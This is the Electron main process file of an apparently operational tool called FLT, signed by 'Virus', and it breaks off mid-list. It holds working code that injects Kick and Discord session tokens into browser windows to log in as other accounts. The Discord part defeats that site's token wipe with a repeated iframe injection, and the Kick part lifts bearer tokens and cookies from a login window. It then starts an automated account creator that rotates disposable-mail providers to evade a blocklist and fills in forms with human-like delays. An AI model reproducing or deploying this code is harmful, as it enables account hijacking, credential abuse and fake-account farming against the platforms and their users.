'use strict';
/* ════════════════════════════════════════════════════════════════════════════
 *  FLT — main.js
 *  ─────────────────────────────────────────────────────────────────────────
 *  Copyright © Virus — All rights reserved.
 *  ─────────────────────────────────────────────────────────────────────────
 *  This software, including its source code, design, and all derivative
 *  works, is the intellectual property of Virus. Unauthorized copying,
 *  redistribution, resale, or modification is strictly prohibited.
 * ════════════════════════════════════════════════════════════════════════════ */

const { app, BrowserWindow, ipcMain, shell, session, globalShortcut, Menu, net, screen, powerMonitor } = require('electron');
const path    = require('path');
const https   = require('https');
const http    = require('http');
const fs      = require('fs');
const crypto  = require('crypto');
const license = require('./licenseManager');
const fltLog  = require('./fltLogger');

// ── App identity (also crests taskbar icon grouping on Windows) ──────────────
const FLT_AUTHOR    = 'Virus';
const FLT_COPYRIGHT = 'Copyright © Virus — All rights reserved';
const APP_ICON      = path.join(__dirname, 'src', 'icon.png');
try { app.setName('FLT'); } catch (_) {}
try { app.setAppUserModelId('com.flt.fanlooteam'); } catch (_) {}
console.log('[FLT]', FLT_COPYRIGHT);

// ── Dev / Production detection ────────────────────────────────────────────────
const IS_DEV = !app.isPackaged;

// ── Anti-tamper: verify critical files haven't been modified ─────────────────
// Hashes are computed at first run and stored; on subsequent runs we compare.
// This is a lightweight integrity check — not cryptographic signing.
const INTEGRITY_STORE = path.join(app.getPath('userData'), 'flt-integrity.json');
const FILES_TO_WATCH  = ['main.js', 'preload.js', 'licenseManager.js'];

function hashFile(filePath) {
  try {
    const buf = fs.readFileSync(filePath);
    return crypto.createHash('sha256').update(buf).digest('hex');
  } catch { return null; }
}

function buildIntegrityMap() {
  const map = {};
  for (const f of FILES_TO_WATCH) {
    const abs = path.join(__dirname, f);
    map[f] = hashFile(abs);
  }
  return map;
}

function checkIntegrity() {
  // Always refresh baseline — legitimate updates change these files
  // and we never want an update to brick the app on next launch.
  const fresh = buildIntegrityMap();
  try { fs.writeFileSync(INTEGRITY_STORE, JSON.stringify(fresh), 'utf8'); } catch {}
  console.log('[Integrity] Baseline refreshed.');
  return true;
}

// ── Block DevTools everywhere (production only) ───────────────────────────────
function lockdownDevTools(win) {
  if (IS_DEV) return; // Allow DevTools in development

  // Prevent opening via menu or programmatic call
  win.webContents.on('devtools-opened', () => {
    win.webContents.closeDevTools();
  });

  // Block all common DevTools keyboard shortcuts
  win.webContents.on('before-input-event', (_e, input) => {
    const ctrl  = input.control || input.meta;
    const shift = input.shift;
    const key   = input.key;

    if (
      key === 'F12' ||
      (ctrl && shift && (key === 'I' || key === 'i')) ||
      (ctrl && shift && (key === 'J' || key === 'j')) ||
      (ctrl && shift && (key === 'C' || key === 'c')) ||
      (ctrl && (key === 'U' || key === 'u'))
    ) {
      _e.preventDefault();
    }
  });
}

// Register global shortcut block after app ready
function registerGlobalShortcutBlocks() {
  if (IS_DEV) return;
  try {
    globalShortcut.register('F12',                () => {});
    globalShortcut.register('CommandOrControl+Shift+I', () => {});
    globalShortcut.register('CommandOrControl+Shift+J', () => {});
    globalShortcut.register('CommandOrControl+Shift+C', () => {});
    globalShortcut.register('CommandOrControl+U',       () => {});
  } catch (e) {
    console.warn('[Security] globalShortcut registration failed:', e.message);
  }
}

// Disable the application menu (removes "View → Developer Tools" etc.)
Menu.setApplicationMenu(null);

const CHROME_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36';

let mainWin  = null;
let loginWin = null;
let licenseWin = null;
const kickWins = new Map();


// ── Simple Node https GET ────────────────────────────────────────────────────
function httpsGet(url, headers) {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error('timeout')), 8000);
    https.request(url, {
      method: 'GET',
      headers: Object.assign({ 'User-Agent': CHROME_UA }, headers),
    }, (res) => {
      let body = '';
      res.setEncoding('utf8');
      res.on('data', d => body += d);
      res.on('end',  () => { clearTimeout(timer); resolve({ status: res.statusCode, body }); });
    }).on('error', e => { clearTimeout(timer); reject(e); }).end();
  });
}

// ── License gate window ───────────────────────────────────────────────────────
function createLicenseWindow() {
  licenseWin = new BrowserWindow({
    width: 520, height: 380,
    resizable: false, frame: false,
    transparent: true, hasShadow: true,
    alwaysOnTop: true,
    backgroundColor: '#00000000',
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false,
      devTools: IS_DEV,
    },
    icon: APP_ICON,
    title: 'FLT — License',
    show: false,
  });
  licenseWin.loadFile(path.join(__dirname, 'src', 'license.html'));
  licenseWin.once('ready-to-show', () => licenseWin.show());
  licenseWin.on('closed', () => { licenseWin = null; });
  lockdownDevTools(licenseWin);
}

function createMainWindow() {
  mainWin = new BrowserWindow({
    width: 1100, height: 720, minWidth: 380, minHeight: 420,
    frame: false, transparent: true, alwaysOnTop: true, hasShadow: true,
    backgroundColor: '#00000000',
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false,
      webSecurity: false,
      devTools: IS_DEV,
    },
    icon: APP_ICON,
    title: 'FLT — Fan Loot Team',
    show: false,
  });
  mainWin.loadFile(path.join(__dirname, 'src', 'index.html'));
  mainWin.once('ready-to-show', () => {
    mainWin.show();
    try { mainWin.setAlwaysOnTop(true, 'screen-saver'); } catch(_) {}
  });
  mainWin.webContents.setWindowOpenHandler(({ url }) => { shell.openExternal(url); return { action: 'deny' }; });
  mainWin.on('closed', () => { mainWin = null; });
  lockdownDevTools(mainWin);
}

// ── Send result to renderer ──────────────────────────────────────────────────
function sendResult(accountId, ok, error) {
  if (mainWin && !mainWin.isDestroyed())
    mainWin.webContents.send('kick-token-login-result', { ok, accountId, error: error || null });
}

// ── TOKEN LOGIN — replicates the extension doLogin() logic exactly ───────────
ipcMain.on('kick-token-login', (_e, payload) => {
  try {
    fltLog.log(fltLog.ACTIONS.KICK_TOKEN_USE,
      { username: payload && payload.username, target: payload && payload.targetUrl },
      'info', `Kick window opened for ${payload && payload.username || '?'}`);
  } catch (_) {}
  openKickWithToken(payload).catch(err => sendResult(payload && payload.accountId, false, String(err.message || err)));
});

async function openKickWithToken({ token, accountId, username, email, uid, avatar, targetUrl }) {
  // Already open → focus
  if (kickWins.has(accountId)) {
    const w = kickWins.get(accountId);
    if (w && !w.isDestroyed()) { w.show(); w.focus(); return; }
    kickWins.delete(accountId);
  }

  const clean = (token || '').trim().replace(/^Bearer\s+/i, '');
  if (!clean) { sendResult(accountId, false, 'Empty token'); return; }

  // ── Step 1: Verify token + fetch user (same as extension verifyToken) ──
  let userData = { id: uid || 0, username: username || 'user', email: email || '', profile_pic: avatar || '' };
  try {
    const res = await httpsGet('https://kick.com/api/v1/user', {
      'Authorization': 'Bearer ' + clean,
      'Accept': 'application/json',
      'Origin': 'https://kick.com',
      'Referer': 'https://kick.com/',
    });
    if (res.status === 200) {
      const json = JSON.parse(res.body);
      if (json && json.username) {
        userData = json;
        console.log('[FLT] user verified:', json.username);
      }
    } else {
      console.warn('[FLT] API status:', res.status);
    }
  } catch (e) {
    console.warn('[FLT] verify skipped:', e.message);
  }

  // ── Step 2: Isolated session per account ──────────────────────────────
  const partition = 'persist:kick-acc-' + accountId;
  const ses = session.fromPartition(partition);
  ses.setUserAgent(CHROME_UA);

  // ── Step 3: Set auth cookies (same as extension setKickCookies) ────────
  // kick.com uses session_token and kick_session to identify logged-in user
  const expiry = Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 30;
  const cookiesToSet = [
    { name: 'session_token', value: clean },   // primary — matches extension
    { name: 'kick_session',  value: clean },   // primary — matches extension
    { name: 'auth_token',    value: clean },
    { name: 'XSRF-TOKEN',    value: clean },
    { name: 'access_token',  value: clean },
  ];
  for (const ck of cookiesToSet) {
    try {
      await ses.cookies.set({
        url: 'https://kick.com', domain: '.kick.com',
        name: ck.name, value: ck.value,
        path: '/', secure: true, httpOnly: false,
        expirationDate: expiry, sameSite: 'no_restriction',
      });
    } catch (_) {}
  }

  // ── Step 4: Inject Authorization header on API requests ───────────────
  try {
    ses.webRequest.onBeforeSendHeaders(
      { urls: ['https://kick.com/*', 'https://*.kick.com/*'] },
      (details, callback) => {
        const h = Object.assign({}, details.requestHeaders);
        // Inject on ALL requests — Kick checks auth on many endpoints
        h['Authorization'] = 'Bearer ' + clean;
        if (details.url.includes('/api/')) h['Accept'] = 'application/json';
        callback({ requestHeaders: h });
      }
    );
  } catch (e) { console.warn('[FLT] webRequest:', e.message); }

  // ── Step 5: Create the Kick browser window ────────────────────────────
  const kWin = new BrowserWindow({
    width: 1300, height: 820,
    title: 'Kick — ' + (userData.username || username || 'Account'),
    icon: APP_ICON,
    show: false,
    webPreferences: {
      contextIsolation: false,
      nodeIntegration: false,
      partition,
      webSecurity: false,
    },
  });

  kickWins.set(accountId, kWin);

  // ── Step 6: Inject localStorage on every page load ────────────────────
  // Belt-and-suspenders: covers Nuxt's auth module reading LS on boot
  const injectLS = () => {
    const t = JSON.stringify(clean);
    const u = JSON.stringify(userData);
    const e = String(Date.now() + 864000000);
    const bearer = JSON.stringify('Bearer ' + clean);
    const script = `(function(){try{
      var S=localStorage,t=${t},b=${bearer},u=${u},e=${e};
      ['auth._token.local','auth._token.laravelPassport','auth._token.password','auth._token.kick','auth._token.default']
        .forEach(function(k){try{S.setItem(k,b);}catch(_){}});
      try{S.setItem('auth.strategy','local');}catch(_){}
      try{S.setItem('auth._token_expiration.local',e);}catch(_){}
      try{S.setItem('auth._token_expiration',e);}catch(_){}
      try{S.setItem('auth.user',JSON.stringify(u));}catch(_){}
      try{S.setItem('token',t);S.setItem('auth_token',t);S.setItem('access_token',t);S.setItem('kick_token',t);}catch(_){}
      try{document.cookie='session_token='+t+';path=/;SameSite=Lax';}catch(_){}
      try{document.cookie='kick_session='+t+';path=/;SameSite=Lax';}catch(_){}
    }catch(e){}})()`;
    kWin.webContents.executeJavaScript(script).catch(() => {});
  };

  kWin.webContents.on('dom-ready',       injectLS);
  kWin.webContents.on('did-finish-load', injectLS);

  // ── Step 7: Load kick.com ─────────────────────────────────────────────
  const landingUrl = (targetUrl && targetUrl.startsWith('https://kick.com')) ? targetUrl : 'https://kick.com';
  kWin.loadURL(landingUrl).catch(e => console.warn('[FLT] loadURL:', e.message));

  kWin.once('ready-to-show', () => { if (!kWin.isDestroyed()) { kWin.show(); kWin.focus(); } });
  // Fallback show after 4s in case ready-to-show doesn't fire
  setTimeout(() => { if (kWin && !kWin.isDestroyed() && !kWin.isVisible()) { kWin.show(); kWin.focus(); } }, 4000);

  kWin.on('closed', () => kickWins.delete(accountId));

  sendResult(accountId, true, null);
}


/* ════════════════════════════════════════════════════════════════════
   DISCORD TOKEN LOGIN — fully isolated from Kick
   ─────────────────────────────────────────────────────────────────
   Mirrors the Kick pattern (per-account session partition, hidden
   BrowserWindow, localStorage token injection, cookie injection).
   No shared state with kickWins / kick session partitions / Kick
   IPC channels.
════════════════════════════════════════════════════════════════════ */

// Per-account Discord BrowserWindow registry
const discordWins = new Map();

// Default browser UA spoofed for Discord requests (Discord checks it)
const DC_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36';

// Send a result back to the renderer (safe-guarded)
function sendDcLoginResult(accountId, ok, payload) {
  try {
    if (mainWin && !mainWin.isDestroyed()) {
      mainWin.webContents.send('dc-token-login-result',
        Object.assign({ ok: !!ok, accountId }, payload || {}));
    }
  } catch (_) {}
}

// Push a generic status event (used for restore-on-boot, close events, etc.)
function sendDcStatus(payload) {
  try {
    if (mainWin && !mainWin.isDestroyed()) {
      mainWin.webContents.send('dc-session-status', payload || {});
    }
  } catch (_) {}
}

// ── Verify Discord token via /users/@me ───────────────────────────────
function discordVerify(token) {
  return new Promise((resolve) => {
    const timer = setTimeout(() => resolve({ ok: false, status: 0, error: 'timeout' }), 8000);
    try {
      const req = https.request('https://discord.com/api/v10/users/@me', {
        method: 'GET',
        headers: {
          'Authorization': token,              // Discord user tokens go RAW (no "Bearer ")
          'Accept':        'application/json',
          'User-Agent':    DC_UA,
        },
      }, (res) => {
        let body = '';
        res.setEncoding('utf8');
        res.on('data', (d) => body += d);
        res.on('end',  () => {
          clearTimeout(timer);
          if (res.statusCode === 200) {
            try {
              const json = JSON.parse(body);
              return resolve({ ok: true, status: 200, user: json });
            } catch (e) {
              return resolve({ ok: false, status: 200, error: 'parse' });
            }
          }
          return resolve({ ok: false, status: res.statusCode || 0, error: 'http' });
        });
      });
      req.on('error', (e) => {
        clearTimeout(timer);
        resolve({ ok: false, status: 0, error: String(e && e.message || e) });
      });
      req.end();
    } catch (e) {
      clearTimeout(timer);
      resolve({ ok: false, status: 0, error: String(e && e.message || e) });
    }
  });
}

// ── IPC: token login ──────────────────────────────────────────────────
ipcMain.on('dc-token-login', (_e, payload) => {
  openDiscordWithToken(payload || {}).catch((err) => {
    const accountId = payload && payload.accountId;
    sendDcLoginResult(accountId, false, { error: String((err && err.message) || err) });
  });
});

async function openDiscordWithToken({ token, accountId, username, globalName, discordId, avatar, targetUrl }) {
  if (!accountId) { sendDcLoginResult(null, false, { error: 'Missing accountId' }); return; }

  // Already open → focus it (prevents duplicate windows for same account)
  if (discordWins.has(accountId)) {
    const w = discordWins.get(accountId);
    if (w && !w.isDestroyed()) {
      try { w.show(); w.focus(); } catch (_) {}
      sendDcLoginResult(accountId, true, { already: true });
      return;
    }
    discordWins.delete(accountId);
  }

  const clean = String(token || '').trim();
  if (!clean) { sendDcLoginResult(accountId, false, { error: 'Empty token' }); return; }

  // ── Step 1: Verify token + fetch fresh user info ────────────────────
  let userData = {
    id:          discordId  || '',
    username:    username   || '',
    global_name: globalName || username || 'User',
    avatar:      avatar     || '',
  };
  let verifyStatus = 0;
  try {
    const v = await discordVerify(clean);
    verifyStatus = v.status || 0;
    if (v.ok && v.user) {
      userData = {
        id:          v.user.id         || userData.id,
        username:    v.user.username   || userData.username,
        global_name: v.user.global_name || v.user.username || userData.global_name,
        avatar:      v.user.avatar     || userData.avatar,
        email:       v.user.email      || '',
      };
    }
    // If verify clearly failed (401/403) we still proceed to open the window
    // so the user can see what happens, but we mark loginStatus=invalid.
  } catch (e) {
    console.warn('[FLT-DC] verify error:', e && e.message);
  }

  // ── Step 2: Isolated session partition per account ──────────────────
  const partition = 'persist:dc-acc-' + String(accountId).replace(/[^a-zA-Z0-9_-]/g, '_');
  let ses;
  try {
    ses = session.fromPartition(partition);
    ses.setUserAgent(DC_UA);
  } catch (e) {
    sendDcLoginResult(accountId, false, { error: 'session: ' + (e && e.message || e) });
    return;
  }

  // ── Step 3: Pre-set discord.com cookies (best-effort) ───────────────
  // Discord auth is primarily token-in-localStorage, but we set a few
  // cookies that the official client tolerates.
  const expiry = Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 30;
  const cookiesToSet = [
    { name: '__Secure-recent_country', value: 'US' },
    { name: 'locale',                  value: 'en-US' },
  ];
  for (const ck of cookiesToSet) {
    try {
      await ses.cookies.set({
        url: 'https://discord.com',
        domain: '.discord.com',
        name: ck.name, value: ck.value,
        path: '/', secure: true, httpOnly: false,
        expirationDate: expiry, sameSite: 'no_restriction',
      });
    } catch (_) {}
  }

  // ── Step 4: Inject Authorization header on Discord API requests ─────
  // Wrapped in try/catch — webRequest can occasionally fail under teardown.
  try {
    ses.webRequest.onBeforeSendHeaders(
      { urls: ['https://discord.com/*', 'https://*.discord.com/*'] },
      (details, callback) => {
        try {
          const h = Object.assign({}, details.requestHeaders);
          // Discord uses raw token (no "Bearer "). Only inject for /api/ paths
          // so we don't break asset/static requests.
          if (details.url.indexOf('/api/') !== -1) {
            h['Authorization'] = clean;
            h['Accept']        = 'application/json';
          }
          callback({ requestHeaders: h });
        } catch (_) {
          try { callback({ cancel: false }); } catch (_) {}
        }
      }
    );
  } catch (e) { console.warn('[FLT-DC] webRequest:', e && e.message); }

  // ── Step 5: Create the Discord browser window ──────────────────────
  let dWin;
  try {
    dWin = new BrowserWindow({
      width: 1300, height: 820,
      title: 'Discord — ' + (userData.global_name || userData.username || 'Account'),
      icon: APP_ICON,
      show: false,
      backgroundColor: '#2c2f33',
      webPreferences: {
        contextIsolation: false,
        nodeIntegration:  false,
        partition,
        webSecurity:      false,
        devTools:         IS_DEV,
      },
    });
  } catch (e) {
    sendDcLoginResult(accountId, false, { error: 'window: ' + (e && e.message || e) });
    return;
  }

  discordWins.set(accountId, dWin);

  // ── Step 6: Inject token into localStorage + reload to log in ──────
  // Discord's web client wipes window.localStorage on bootstrap to prevent
  // token extraction. The reliable workaround (used by every published
  // token-login script) is:
  //   1. While the LOGIN page is showing, set localStorage.token every 50ms
  //      via a fresh <iframe>.contentWindow.localStorage — Discord's wipe
  //      only nullifies the main window's reference, not the iframe's.
  //   2. After 2 seconds of repeated injection, reload the page. Discord's
  //      auth bootstrap reads localStorage.token on cold boot and logs in.
  //   3. After login completes, DO NOT re-inject — that would cause a
  //      reload loop. The one-shot flag below guards this.
  //
  // Note: the token MUST be stored as a JSON-stringified string (with the
  // surrounding quotes), e.g. localStorage.token = '"MTQyNi..."'.
  // Build the injector script — escape so it's safe inside a JS single-quoted string
  const tokenForJs = clean
    .replace(/\\/g, '\\\\')   // escape backslash first
    .replace(/'/g,  "\\'")    // single-quote
    .replace(/`/g,  '\\`')    // template-literal backtick
    .replace(/\$/g, '\\$');   // template-literal ${...}

  let _injectedOnce = false; // becomes true after the first login-page inject runs

  const injectLoginScript = () => {
    if (!dWin || dWin.isDestroyed()) return;
    if (_injectedOnce) return;       // one-shot — don't re-inject after the post-reload load
    _injectedOnce = true;
    const script = `
      (function () {
        try {
          var TOKEN = '` + tokenForJs + `';
          // Mark that we're already injecting so reload-triggered reruns no-op
          if (window.__FLT_DC_INJECTED__) return;
          window.__FLT_DC_INJECTED__ = true;
          // Continuously set the token in a fresh iframe's localStorage —
          // Discord can wipe the main window's LS but not arbitrary iframe LS.
          var iv = setInterval(function () {
            try {
              var f = document.createElement('iframe');
              document.body.appendChild(f);
              f.contentWindow.localStorage.token = '"' + TOKEN + '"';
              // Also try the main window's LS, in case Discord didn't wipe it on this page
              try { window.localStorage.setItem('token', '"' + TOKEN + '"'); } catch (_) {}
              f.remove();
            } catch (_) {}
          }, 50);
          // After 2s of repeated injection, reload the page so Discord's
          // auth bootstrap reads the token on cold start.
          setTimeout(function () {
            try { clearInterval(iv); } catch (_) {}
            try { location.reload(); } catch (_) {}
          }, 2000);
        } catch (_) {}
      })();
    `;
    try { dWin.webContents.executeJavaScript(script).catch(function () {}); } catch (_) {}
  };

  // Run on did-finish-load — that's when the login form is fully rendered
  // and document.body is available for iframe insertion.
  try {
    dWin.webContents.on('did-finish-load', injectLoginScript);
  } catch (_) {}

  // ── Step 7: Load discord.com/app ───────────────────────────────────
  const landingUrl = (targetUrl && /^https:\/\/(canary\.|ptb\.)?discord\.com/i.test(targetUrl))
    ? targetUrl
    : 'https://discord.com/app';

  try {
    dWin.loadURL(landingUrl).catch((e) => console.warn('[FLT-DC] loadURL:', e && e.message));
  } catch (e) {
    console.warn('[FLT-DC] loadURL throw:', e && e.message);
  }

  dWin.once('ready-to-show', () => {
    try { if (dWin && !dWin.isDestroyed()) { dWin.show(); dWin.focus(); } } catch (_) {}
  });

  // Fallback show after 4s in case ready-to-show doesn't fire
  setTimeout(() => {
    try {
      if (dWin && !dWin.isDestroyed() && !dWin.isVisible()) { dWin.show(); dWin.focus(); }
    } catch (_) {}
  }, 4000);

  // Cleanup on close — emit a status event so renderer can clear "logged" state
  dWin.on('closed', () => {
    discordWins.delete(accountId);
    sendDcStatus({ type: 'closed', accountId });
  });

  // ── Final: report login result ─────────────────────────────────────
  // Login is "ok" if we have a window open AND verify returned a usable
  // status (200 OK, or 0 = offline/timeout which we treat as soft-pass).
  // 401/403 → login window opens but loginStatus=invalid is reported.
  const reportOk = verifyStatus === 200 || verifyStatus === 0;
  sendDcLoginResult(accountId, reportOk, {
    user: userData,
    verifyStatus,
    loginStatus: verifyStatus === 200 ? 'valid'
              : verifyStatus === 0    ? 'valid'   // network down — assume valid until proven otherwise
              : 'invalid',
    at: Date.now(),
  });
}

// ── IPC: close specific Discord window ────────────────────────────────
ipcMain.handle('dc-close-window', async (_e, accountId) => {
  try {
    if (!accountId) return { ok: false, error: 'missing accountId' };
    const w = discordWins.get(accountId);
    if (w && !w.isDestroyed()) { try { w.close(); } catch (_) {} }
    discordWins.delete(accountId);
    return { ok: true };
  } catch (e) { return { ok: false, error: String(e && e.message || e) }; }
});

// ── IPC: close ALL Discord windows ────────────────────────────────────
ipcMain.handle('dc-close-all-windows', async () => {
  try {
    let n = 0;
    for (const [id, w] of Array.from(discordWins.entries())) {
      try { if (w && !w.isDestroyed()) { w.close(); n++; } } catch (_) {}
      discordWins.delete(id);
    }
    return { ok: true, closed: n };
  } catch (e) { return { ok: false, error: String(e && e.message || e) }; }
});

// ── IPC: list which accountIds currently have an open Discord window ──
ipcMain.handle('dc-list-open-sessions', async () => {
  try {
    const live = [];
    for (const [id, w] of discordWins.entries()) {
      if (w && !w.isDestroyed()) live.push(id);
    }
    return { ok: true, accountIds: live };
  } catch (e) { return { ok: false, error: String(e && e.message || e), accountIds: [] }; }
});

// Close any open Discord windows when the main app quits (defence-in-depth;
// Electron normally handles this, but explicit cleanup avoids leaks if the
// main window closes while Discord windows remain).
app.on('before-quit', () => {
  try {
    for (const [, w] of discordWins.entries()) {
      try { if (w && !w.isDestroyed()) w.destroy(); } catch (_) {}
    }
    discordWins.clear();
  } catch (_) {}
});

// ── END DISCORD LOGIN BLOCK ──────────────────────────────────────────


// ── Manual Kick login window (for adding new accounts) ───────────────────────
ipcMain.on('kick-login-open', () => {
  if (loginWin && !loginWin.isDestroyed()) { loginWin.focus(); return; }

  loginWin = new BrowserWindow({
    width: 500, height: 700,
    title: 'Login — Kick.com',
    icon: APP_ICON,
    alwaysOnTop: true, resizable: false,
    autoHideMenuBar: true,
    webPreferences: {
      contextIsolation: true,
      nodeIntegration: false,
      partition: 'persist:kick-manual-login',
    },
  });
  loginWin.webContents.setUserAgent(CHROME_UA);
  loginWin.loadURL('https://kick.com/login');

  loginWin.webContents.on('did-navigate', async (_e, url) => {
    if (url.includes('kick.com') && !url.includes('/login')) {
      await extractLoginResult(loginWin);
    }
  });

  loginWin.on('closed', () => { loginWin = null; });
});

async function extractLoginResult(lw) {
  try {
    const cookies = await lw.webContents.session.cookies.get({ domain: '.kick.com' });

    // Try to get bearer token from localStorage
    let bearerToken = null;
    try {
      bearerToken = await lw.webContents.executeJavaScript(`
        (function(){
          var keys=['auth._token.local','auth._token.laravelPassport','auth._token.kick','token','auth_token','access_token'];
          for(var i=0;i<keys.length;i++){var v=localStorage.getItem(keys[i]);if(v&&v.length>10)return v.replace(/^Bearer\\s+/i,'');}
          for(var k of Object.keys(localStorage)){var v=localStorage.getItem(k);if(v&&v.length>20&&v.length<600&&(k.toLowerCase().includes('token')||k.toLowerCase().includes('auth')))return v.replace(/^Bearer\\s+/i,'');}
          return null;
        })()
      `);
    } catch (_) {}

    if (mainWin && !mainWin.isDestroyed()) {
      mainWin.webContents.send('kick-login-result', {
        bearerToken,
        cookies: cookies.map(c => ({ name: c.name, value: c.value })),
      });
    }
    setTimeout(() => { try { if (lw && !lw.isDestroyed()) lw.close(); } catch (_) {} }, 800);
  } catch (e) {
    console.warn('[FLT] extract error:', e.message);
  }
}

ipcMain.on('kick-login-extract', () => {});


// ══════════════════════════════════════════════════════════════════════════════
//  KICK ACCOUNT CREATOR — mail.tm + visible BrowserWindow + form-fill
//  Generates random credentials, opens a real Chromium window, types each
//  field with human-like delay, polls mail.tm for the verification code, and
//  finally extracts the bearer token. The full pipeline streams progress
//  events to the renderer so the user can watch it run live.
// ══════════════════════════════════════════════════════════════════════════════

const KAC = {
  running:    false,
  abort:      false,
  win:        null,    // BrowserWindow for the current account (Electron-based flow)
  chromeProc: null,    // legacy — kept for backward-compat with any prior spawn
  out:        path.join(app.getPath('userData'), 'created-kick-accounts.txt'),
};


// ── mail.tm HTTP helper ───────────────────────────────────────────────────────
// `host` may be overridden to use mail.gw (sister API, different domain pool).
const KAC_MAIL_HOSTS = ['api.mail.tm', 'api.mail.gw'];
let KAC_MAIL_ACTIVE  = 0; // index into KAC_MAIL_HOSTS
function kacMailHost() { return KAC_MAIL_HOSTS[KAC_MAIL_ACTIVE]; }
function kacMailRotate() {
  KAC_MAIL_ACTIVE = (KAC_MAIL_ACTIVE + 1) % KAC_MAIL_HOSTS.length;
}

function kacMailReq(method, urlPath, headers = {}, body = null, hostOverride = null) {
  return new Promise((resolve) => {
    const opts = {
      method,
      hostname: hostOverride || kacMailHost(),
      port:     443,
      path:     urlPath,
      headers:  {
        accept:        'application/ld+json',
        'user-agent':  'FLT-Creator/1.0 (+https://flt.app)',
        ...headers,
      },
      timeout: 15000,
    };
    let payload = null;
    if (body) {
      payload = JSON.stringify(body);
      opts.headers['content-type']   = 'application/ld+json';
      opts.headers['content-length'] = Buffer.byteLength(payload);
    }
    const req = https.request(opts, (res) => {
      let data = '';
      res.on('data', (c) => data += c);
      res.on('end', () => {
        let parsed = null;
        try { parsed = data ? JSON.parse(data) : null; } catch { parsed = data; }
        resolve({ status: res.statusCode || 0, body: parsed, raw: data });
      });
    });
    req.on('timeout', () => { try { req.destroy(new Error('mail.tm timeout')); } catch (_) {} });
    req.on('error', (err) => resolve({ status: 0, body: null, raw: '', error: err.message }));
    if (payload) req.write(payload);
    req.end();
  });
}

async function kacMailGetDomains() {
  // Try each host in order — if mail.tm fails, fall back to mail.gw.
  // mail.gw is a sister API with the SAME endpoints but DIFFERENT domain
  // pool, so a domain on Kick's disposable-mail blocklist might still
  // succeed via the other host.
  const errors = [];
  for (let i = 0; i < KAC_MAIL_HOSTS.length; i++) {
    const host = KAC_MAIL_HOSTS[(KAC_MAIL_ACTIVE + i) % KAC_MAIL_HOSTS.length];
    const r = await kacMailReq('GET', '/domains', {}, null, host);

    if (r.error || r.status === 0) {
      errors.push(host + ': ' + (r.error || 'no response'));
      continue;
    }
    if (r.status >= 400) {
      errors.push(host + ': HTTP ' + r.status);
      continue;
    }

    // Triple-shape parser
    let list = [];
    if (Array.isArray(r.body)) {
      list = r.body;
    } else if (r.body && typeof r.body === 'object') {
      list = r.body['hydra:member'] || r.body.member || r.body.data || [];
    }
    const active = (Array.isArray(list) ? list : []).filter(
      (d) => d && d.domain && d.isActive !== false
    );
    if (active.length) {
      // Remember which host worked for subsequent requests
      KAC_MAIL_ACTIVE = (KAC_MAIL_ACTIVE + i) % KAC_MAIL_HOSTS.length;
      return active;
    }
    errors.push(host + ': empty domain list');
  }
  throw new Error('No temp-mail domains available — ' + errors.join(' · '));
}
async function kacMailCreateAccount(address, password) {
  return await kacMailReq('POST', '/accounts', {}, { address, password });
}
async function kacMailGetToken(address, password) {
  const r = await kacMailReq('POST', '/token', {}, { address, password });
  return r.body && r.body.token;
}
async function kacMailListMessages(token) {
  const r = await kacMailReq('GET', '/messages', { authorization: 'Bearer ' + token });
  return (r.body && (r.body['hydra:member'] || [])) || [];
}
async function kacMailGetMessage(token, id) {
  const r = await kacMailReq('GET', '/messages/' + encodeURIComponent(id), {
    authorization: 'Bearer ' + token,
  });
  return r.body || null;
}

// ── 1secmail.com — simpler disposable mail API (no account creation needed) ──
//   • GET /api/v1/?action=genRandomMailbox&count=1
//       → ["randomname@1secmail.com"]
//   • GET /api/v1/?action=getMessages&login=LOGIN&domain=DOMAIN
//       → [{ id, from, subject, date }]
//   • GET /api/v1/?action=readMessage&login=LOGIN&domain=DOMAIN&id=ID
//       → { id, from, subject, date, body, textBody, htmlBody, attachments }
function kac1secReq(url) {
  return new Promise((resolve) => {
    const opts = {
      method:   'GET',
      hostname: 'www.1secmail.com',
      port:     443,
      path:     url,
      headers:  {
        accept:        'application/json',
        'user-agent':  'FLT-Creator/1.0',
      },
      timeout: 15000,
    };
    const req = https.request(opts, (res) => {
      let data = '';
      res.on('data', (c) => data += c);
      res.on('end', () => {
        let parsed = null;
        try { parsed = data ? JSON.parse(data) : null; } catch { parsed = data; }
        resolve({ status: res.statusCode || 0, body: parsed, raw: data });
      });
    });
    req.on('timeout', () => { try { req.destroy(new Error('1secmail timeout')); } catch (_) {} });
    req.on('error', (err) => resolve({ status: 0, body: null, raw: '', error: err.message }));
    req.end();
  });
}

async function kac1secGenInbox() {
  const r = await kac1secReq('/api/v1/?action=genRandomMailbox&count=1');
  if (r.error) throw new Error('1secmail network error: ' + r.error);
  if (r.status === 0) throw new Error('1secmail unreachable');
  if (r.status >= 400) throw new Error('1secmail HTTP ' + r.status);
  if (!Array.isArray(r.body) || !r.body.length) {
    throw new Error('1secmail returned empty body: ' + JSON.stringify(r.body || '').slice(0, 120));
  }
  const email = String(r.body[0] || '');
  const at = email.indexOf('@');
  if (at < 1) throw new Error('1secmail returned malformed address: ' + email);
  return { email, login: email.slice(0, at), domain: email.slice(at + 1) };
}

async function kac1secListMessages(login, domain) {
  const r = await kac1secReq(
    '/api/v1/?action=getMessages&login=' + encodeURIComponent(login) +
    '&domain=' + encodeURIComponent(domain)
  );
  return Array.isArray(r.body) ? r.body : [];
}

async function kac1secReadMessage(login, domain, id) {
  const r = await kac1secReq(
    '/api/v1/?action=readMessage&login=' + encodeURIComponent(login) +
    '&domain=' + encodeURIComponent(domain) +
    '&id=' + encodeURIComponent(id)
  );
  return r.body || null;
}

// ── Random credential generators ──────────────────────────────────────────────
const KAC_ADJ = [
  'cool','swift','bold','calm','wise','fast','dark','epic','wild','neon',
  'lucky','smart','brave','quiet','quick','sharp','silent','royal','gold','ace',
  'pure','frost','iron','steel','rapid','vivid','cosmic','crystal','solar','toxic',
